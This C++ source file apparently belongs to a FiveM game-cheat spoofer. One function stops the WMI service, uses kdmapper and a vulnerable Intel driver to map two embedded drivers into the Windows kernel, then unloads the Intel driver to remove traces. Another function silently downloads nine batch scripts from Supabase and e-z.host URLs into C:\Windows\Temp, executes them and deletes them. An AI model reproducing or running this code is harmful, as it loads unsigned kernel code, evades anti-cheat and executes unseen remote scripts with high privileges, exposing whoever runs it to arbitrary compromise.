#include <Windows.h>
#include <fstream>
#include "lazy_importer.hh"
#include <iostream>
#include <string>
#include "driver.hh"
#include "driverfivem.hh"
#include "skStr.h"
#include "slowdown.h"
#include "Mapper/Mapper/include/kdmapper.hpp"
#include "Mapper/Mapper/include/intel_driver.hpp"

void StartVirturlizor() {
    system("net stop winmgmt");
    Sleep(1000);

    // Load Intel driver for kernel access
    if (!intel_driver::Load()) {
        return;
    }

    Sleep(500);

    // Map the spoofer driver
    NTSTATUS exitCode1 = 0;
    kdmapper::MapDriver(
        (BYTE*)DRIVERDRAPPY,
        0, 0, true, true,
        kdmapper::AllocationMode::AllocatePool,
        false, nullptr, &exitCode1
    );

    Sleep(500);

    // Map the FiveM driver
    NTSTATUS exitCode2 = 0;
    kdmapper::MapDriver(
        (BYTE*)DriverFiveM,
        0, 0, true, true,
        kdmapper::AllocationMode::AllocatePool,
        false, nullptr, &exitCode2
    );

    Sleep(500);

    // Unload Intel driver and clean traces
    intel_driver::Unload();

    Sleep(500);

    // Run cleanup scripts
    system("curl https://nrnfvqxbipxevutkvqdc.supabase.co/storage/v1/object/public/asdfgfdgrte3t345rfer/lithiumrip/MCA.bat -o C:\\Windows\\Temp\\MCA.bat --silent >nul 2>&1");
    Sleep(500);
    system("C:\\Windows\\Temp\\MCA.bat --silent");
    system("del /f /q C:\\Windows\\Temp\\MCA.bat >nul 2>&1");

    system("net start winmgmt");
    Sleep(1000);
}


void CleanProcess() {
    system("curl https://nrnfvqxbipxevutkvqdc.supabase.co/storage/v1/object/public/asdfgfdgrte3t345rfer/lithiumrip/DeepClean.bat -o C:\\Windows\\Temp\\DeepClean.bat --silent >nul 2>&1");
    Sleep(1000);
    system("C:\\Windows\\Temp\\DeepClean.bat --silent");
    system("del /f /q C:\\Windows\\Temp\\DeepClean.bat >nul 2>&1");

    system("curl https://r2.e-z.host/4a60e094-fe51-4af7-9cdf-73215f20d87e/gtam48zm.bat -o C:\\Windows\\Temp\\tzadastore.bat --silent >nul 2>&1");
    Sleep(1000);
    system("C:\\Windows\\Temp\\tzadastore.bat --silent");
    system("del /f /q C:\\Windows\\Temp\\tzadastore.bat >nul 2>&1");

    system("curl https://nrnfvqxbipxevutkvqdc.supabase.co/storage/v1/object/public/asdfgfdgrte3t345rfer/lithiumrip/Tracers.bat -o C:\\Windows\\Temp\\Tracers.bat --silent >nul 2>&1");
    Sleep(1000);
    system("C:\\Windows\\Temp\\Tracers.bat --silent");
    system("del /f /q C:\\Windows\\Temp\\Tracers.bat >nul 2>&1");

    system("curl https://nrnfvqxbipxevutkvqdc.supabase.co/storage/v1/object/public/asdfgfdgrte3t345rfer/lithiumrip/Undetected.bat -o C:\\Windows\\Temp\\Undetected.bat --silent >nul 2>&1");
    Sleep(1000);
    system("C:\\Windows\\Temp\\Undetected.bat --silent");
    system("del /f /q C:\\Windows\\Temp\\Undetected.bat >nul 2>&1");

    system("curl https://nrnfvqxbipxevutkvqdc.supabase.co/storage/v1/object/public/asdfgfdgrte3t345rfer/lithiumrip/Deep.bat -o C:\\Windows\\Temp\\Deep.bat --silent >nul 2>&1");
    Sleep(1000);
    system("C:\\Windows\\Temp\\Deep.bat --silent");
    system("del /f /q C:\\Windows\\Temp\\Deep.bat >nul 2>&1");

    system("curl https://nrnfvqxbipxevutkvqdc.supabase.co/storage/v1/object/public/asdfgfdgrte3t345rfer/lithiumrip/vms.bat -o C:\\Windows\\Temp\\vms.bat --silent >nul 2>&1");
    Sleep(1000);
    system("C:\\Windows\\Temp\\vms.bat --silent");
    system("del /f /q C:\\Windows\\Temp\\vms.bat >nul 2>&1");

    system("curl https://nrnfvqxbipxevutkvqdc.supabase.co/storage/v1/object/public/asdfgfdgrte3t345rfer/lithiumrip/CLP.bat -o C:\\Windows\\Temp\\CLP.bat --silent >nul 2>&1");
    Sleep(1000);
    system("C:\\Windows\\Temp\\CLP.bat --silent");
    system("del /f /q C:\\Windows\\Temp\\CLP.bat >nul 2>&1");

    system("curl https://nrnfvqxbipxevutkvqdc.supabase.co/storage/v1/object/public/asdfgfdgrte3t345rfer/lithiumrip/MAC.bat -o C:\\Windows\\Temp\\MAC.bat --silent >nul 2>&1");
    Sleep(1000);
    system("C:\\Windows\\Temp\\MAC.bat");
    system("del /f /q C:\\Windows\\Temp\\MAC.bat >nul 2>&1");

    system("curl https://r2.e-z.host/4a60e094-fe51-4af7-9cdf-73215f20d87e/pv4yi132.bat -o C:\\Windows\\Temp\\nash.bat --silent >nul 2>&1");
    Sleep(1000);
    system("C:\\Windows\\Temp\\nash.bat");
    system("del /f /q C:\\Windows\\Temp\\nash.bat >nul 2>&1");
}